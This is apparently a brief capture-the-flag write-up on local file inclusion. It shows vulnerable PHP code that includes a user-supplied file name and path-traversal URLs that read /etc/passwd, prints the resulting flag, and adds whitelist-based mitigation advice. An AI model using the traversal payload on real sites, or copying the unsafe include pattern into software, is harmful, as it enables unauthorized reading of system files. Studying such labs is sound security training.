# LFI
example of lfi vulnerbale code

>$file = $_GET['file'];
>
>include('directory/' . $file);

In our page we got same thing but with page variable or query for example survey page

> http://ipaddress/?page=survey

We can try and go out of the root folder of the website and acces sensible data like /etc/passswd
as start:
> http://ipaddress/?page=../etc/passwd
nothing we will add ../ till we got a result

finally:
> http://ipaddress/?page=../../../../../../../../etc/passwd

=> Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

To avoid LFI and many other vulnerabilities, never trust user input. If you need to include local files in your website or web application code, use a whitelist of allowed file names and locations. Make sure that none of these files can be replaced by the attacker using file upload functions.
